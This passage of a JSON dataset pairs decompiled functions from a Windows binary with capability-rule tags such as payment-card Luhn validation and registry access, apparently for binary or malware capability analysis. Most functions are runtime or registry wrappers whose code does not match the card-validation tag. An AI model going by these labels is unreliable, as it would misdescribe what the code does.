        "token_count": 314
    },
    "0041e7e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e7e4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41e8bb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.0041cd3c();\n    if ((cVar1 == '\\x06') || (cVar1 == '\\f')) {\n        fcn.0041e728();\n        fcn.00405dc8();\n    }\n    else {\n        cVar1 = fcn.0041e8c8();\n        if (cVar1 == '\\x12') {\n            fcn.0041cd60();\n            fcn.00405ec4();\n            fcn.0041cd60();\n        }\n        else if (cVar1 == '\\x14') {\n            fcn.0041cd60();\n            fcn.00405b8c();\n            fcn.0041cd60();\n            fcn.00407378();\n        }\n        else {\n            fcn.0041c770();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41e8c2;\n    uStack32 = 0x41e8b2;\n    fcn.0040546c();\n    uStack32 = 0x41e8ba;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 366
    },
    "0041ebd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.0041ebd0(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0041ebd0::var_1h + 1;\n    uStack36 = 0x41ec68;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &fcn.0041ebd0::var_1h + 1;\n    if (param_2 != '\\0') {\n        (**(*in_EAX + 0x28))();\n        fcn.0041e6ec();\n        fcn.0041e6ec();\n        puVar1 = puStack32;\n    }\n    while( true ) {\n        puStack32 = puVar1;\n        cVar2 = fcn.0041c944();\n        if (cVar2 != '\\0') break;\n        fcn.0041eb88();\n        puVar1 = puStack32;\n    }\n    fcn.0041da00();\n    while( true ) {\n        cVar2 = fcn.0041c944();\n        if (cVar2 != '\\0') break;\n        fcn.0041ebd0();\n    }\n    fcn.0041da00();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41ec6f;\n    uStack36 = 0x41ec67;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 416
    },
    "0041ede4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ede4(uint param_1, int32_t param_2)\n\n{\n    if (0 < param_2) {\n        do {\n            if (param_2 < 0x101) {\n                fcn.0041cd60();\n                param_2 = 0;\n            }\n            else {\n                fcn.0041cd60();\n                param_2 = param_2 + -0x100;\n            }\n        } while (0 < param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041ee2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ee2c(uint arg_8h)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41efd5;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x41ee58;\n    fcn.0041c7fc();\n    puStack52 = 0x41ee69;\n    fcn.00404610();\n    uStack56 = 0x41efb0;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00404610();\n    fcn.0041cd60();\n    fcn.0041b510(var_18h, var_18h >> 0x1f);\n    fcn.0041cd60();\n    puStack76 = 0x41eed2;\n    fcn.0041c090(0x400);\n    uStack80 = 0x41ef8b;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0041e728();\n    fcn.0041cd60();\n    fcn.0041b510(var_18h, var_18h >> 0x1f);\n    fcn.0041cd60();\n    cVar1 = fcn.00416018();\n    if (cVar1 != '\\0') {\n        fcn.00406f3c();\n        cVar1 = fcn.0040f874();\n        if (cVar1 != '\\0') goto code_r0x0041ef5e;\n    }\n    fcn.0040dab4();\n    fcn.00404eb4();\ncode_r0x0041ef5e:\n    *in_EAX = *(var_1ch + 4);\n    (**(_pe_dos_header + 0xc))();\n    *in_FS_OFFSET = var_18h;\n    iStack84 = 0x41ef92;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 624
    },
    "0041f670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041f670(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x24) = *0x41f6b8;\n    if (param_1 != 0) {\n        fcn.0041f82c();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 189
    },
    "0041fbe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fbe0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    bool bVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    bVar2 = *0x10 == 0x14;\n    fcn.00405894();\n    if (!bVar2) {\n        if (param_2 != 0) {\n            cVar1 = fcn.00409b54();\n            if (cVar1 == '\\0') {\n                uStack16 = 0xb;\n                iStack20 = param_2;\n                fcn.0040daf0(0, &iStack20);\n                fcn.00404eb4();\n            }\n        }\n        if (in_EAX[1] == NULL) {\n            (**(*in_EAX + 0x20))(param_2);\n        }\n        else {\n            (**(*in_EAX[1] + 0x20))(param_2);\n        }\n        fcn.0041fd64();\n        fcn.0041fc70();\n        fcn.0041fd64();\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "0041fd64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fd64(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        fcn.00405708();\n        piVar1 = fcn.00404914();\n        if (piVar1 != NULL) {\n            if (param_2 == '\\0') {\n                *piVar1 = 0;\n            }\n            else {\n                *piVar1 = in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "0041ff94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ff94(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f670();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "0042018c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042018c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 0xc) = in_ECX;\n    *(in_EAX + 0x10) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 185
    },
    "00420708": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420708(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 66
    },
    "00420aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00420aa0(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040daf0(0, auStack12);\n    fcn.00404eb4();\n    return;\n}\n",
        "token_count": 64
    },
    "00420b38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420b38(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00420c14();\n    *(in_EAX + 0x18) = 0xf003f;\n    *(in_EAX + 0xc) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "00420b7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420b7c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00420b38();\n    *(in_EAX + 0x18) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "00420c7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00420c7c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack44 = 0x420d48;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    hKey = 0;\n    fcn.00405504();\n    cVar1 = fcn.00420acc();\n    if (cVar1 == '\\0') {\n        fcn.004059a4();\n    }\n    uVar2 = fcn.004058fc(0, 0, 0, 0xf003f, 0, &fcn.00420c7c::hKey, &fcn.00420c7c::var_ch);\n    uVar2 = fcn.00420c64(uVar2);\n    iVar3 = sub.advapi32.dll_RegCreateKeyExA(uVar2);\n    if (iVar3 == 0) {\n        uVar2 = 0x420d0c;\n        sub.advapi32.dll_RegCloseKey_1(hKey);\n    }\n    else {\n        var_10h._0_1_ = 0xb;\n        uVar2 = 0;\n        var_14h = param_2;\n        fcn.0040daf0(0, &fcn.00420c7c::var_14h);\n        fcn.00404eb4();\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x420d4f);\n    return;\n}\n",
        "token_count": 442
    },
    "0042124c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042124c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x421304;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.004211e4();\n    if (cVar1 != '\\0') {\n        fcn.0040555c();\n        if (-1 < var_28h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_24h + 1;\n                uVar2 = fcn.004058fc(&fcn.0042124c::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumKeyExA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004058fc();\n                fcn.00405664();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x42130b;\n    uStack68 = 0x4212fb;\n    fcn.0040546c();\n    uStack68 = 0x421303;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 471
    },
    "00421314": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421314(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x4213cc;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.004211e4();\n    if (cVar1 != '\\0') {\n        fcn.0040555c();\n        if (-1 < var_20h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_1ch + 1;\n                uVar2 = fcn.004058fc(&fcn.00421314::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumValueA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004058fc();\n                fcn.00405664();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x4213d3;\n    uStack68 = 0x4213c3;\n    fcn.0040546c();\n    uStack68 = 0x4213cb;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 479
    },
    "0042142c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0042142c(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uStack12;\n    \n    cVar1 = fcn.004213dc();\n    uVar2 = uStack12;\n    if (cVar1 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 87
    },
    "00421454": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421454(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uStack16;\n    uint uStack12;\n    \n    cVar1 = fcn.004213dc();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = uStack16;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 100
    },
    "004215fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004215fc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00420ae0();\n    uVar1 = fcn.004058fc(0, uVar1, var_4h, arg_ch);\n    iVar2 = sub.advapi32.dll_RegSetValueExA(*(in_EAX + 4), uVar1);\n    if (iVar2 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040daf0(0, &var_ch);\n        fcn.00404eb4();\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "00421664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00421664(uchar *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar2 = fcn.004058fc(0, &var_4h);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(*(in_EAX + 4), uVar2);\n    if (iVar3 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040daf0(0, &var_ch);\n        fcn.00404eb4();\n    }\n    uVar1 = fcn.00420b10();\n    *arg_8h = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 218
    },
    "004216d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004216d8(void)\n\n{\n    fcn.004213dc();\n    return;\n}\n",
        "token_count": 24
    },
    "004216e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004216e8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x42176e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00405504();\n    cVar1 = fcn.00420acc();\n    if (cVar1 == '\\0') {\n        fcn.004059a4();\n    }\n    var_8h = 0;\n    uVar2 = fcn.004058fc(0, *(in_EAX + 0x18), &var_8h);\n    uVar2 = fcn.00420c64(uVar2);\n    sub.advapi32.dll_RegOpenKeyExA_1();\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x421775);\n    return;\n}\n",
        "token_count": 265
    },
    "00421780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421780(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uVar1 = *(in_EAX + 0x18);\n    uStack28 = 0x4217e5;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *(in_EAX + 0x18) = uVar1 & 0x300 | 0x20009;\n    iStack36 = 0x4217bc;\n    iVar2 = fcn.004216e8();\n    if (iVar2 != 0) {\n        sub.advapi32.dll_RegCloseKey_1();\n        iStack36 = iVar2;\n    }\n    *in_FS_OFFSET = iStack36;\n    *(in_EAX + 0x18) = uVar1;\n    return;\n}\n",
        "token_count": 260
    },
    "004217f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004217f8(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    uint arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint8_t var_11h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(*(arg_8h + -4) + 4);\n    puStack36 = 0x42181d;\n    fcn.00420c78();\n    uStack40 = 0x42190b;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x421838;\n    puStack36 = &stack0xfffffffc;\n    arg_ch = fcn.0042142c();\n    if (0 < arg_ch) {\n        puStack48 = 0x421849;\n        var_10h = fcn.00402ed8();\n        uStack52 = 0x4218e8;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        puStack68 = 0x42186f;\n        puStack48 = &stack0xfffffffc;\n        arg_ch_00 = fcn.00421664(&stack0xffffffeb, arg_ch);\n        var_ch = *(*(arg_8h + -4) + 4);\n        puStack68 = 0x42188b;\n        fcn.00420c78();\n        uStack72 = 0x4218cb;\n        uStack76 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb4;\n        arg_8h_00 = var_11h;\n        puStack68 = &stack0xfffffffc;\n        fcn.004215fc(arg_8h_00, arg_ch_00);\n        *in_FS_OFFSET = arg_8h_00;\n        uStack76 = 0x4218d2;\n        fcn.00420c78();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x421912;\n    uStack40 = 0x42190a;\n    fcn.00420c78();\n    return;\n}\n",
        "token_count": 580
    },
    "00421918": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421918(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x421a2f;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x421955;\n    fcn.00420c78();\n    uStack84 = 0x421a0a;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    cVar1 = fcn.004211e4();\n    if (cVar1 != '\\0') {\n        fcn.004217f8(arg_8h);\n        fcn.0040555c();\n        if (-1 < var_24h + -1) {\n            do {\n                var_ch = var_20h + 1;\n                fcn.004058fc(&fcn.00421918::var_ch, 0, 0, 0, 0);\n                iVar2 = sub.advapi32.dll_RegEnumValueA();\n                if (iVar2 == 0) {\n                    arg_8h_00 = arg_8h;\n                    fcn.004058fc();\n                    fcn.00405664();\n                    fcn.004217f8(arg_8h_00);\n                }\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x421a11;\n    uStack84 = 0x421a09;\n    fcn.00420c78();\n    return;\n}\n",
        "token_count": 519
    },
    "00421ee4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421ee4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x421efe;\n    fcn.004058ec();\n    uStack28 = 0x421f72;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00405784();\n    fcn.00420d58();\n    fcn.004214dc();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x421f79;\n    uStack28 = 0x421f71;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 215
    },
    "00422b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00422b5c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 141
    },
    "00422ef4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422ef4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack40 = 0x422f08;\n        fcn.00404964();\n    }\n    uStack44 = 0x422f66;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00422dd0();\n    fcn.00422e20(arg_8h, arg_14h);\n    fcn.004054c0();\n    fcn.004054c0();\n    *in_FS_OFFSET = arg_8h;\n    uStack48 = 0x422f6d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 233
    },
    "0042306c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042306c(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_8h;\n    uint rclsid;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    uStack52 = 0x42314c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    uStack64 = 0x4230c7;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    uVar1 = fcn.00406f3c();\n    uVar2 = 0x42315c;\n    sub.ole32.dll_CoCreateInstance(in_EAX, 0, 5, 0x42315c, uVar1);\n    fcn.00422fa8();\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = uVar2;\n    uStack68 = 0x423153;\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 304
    },
    "00423344": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
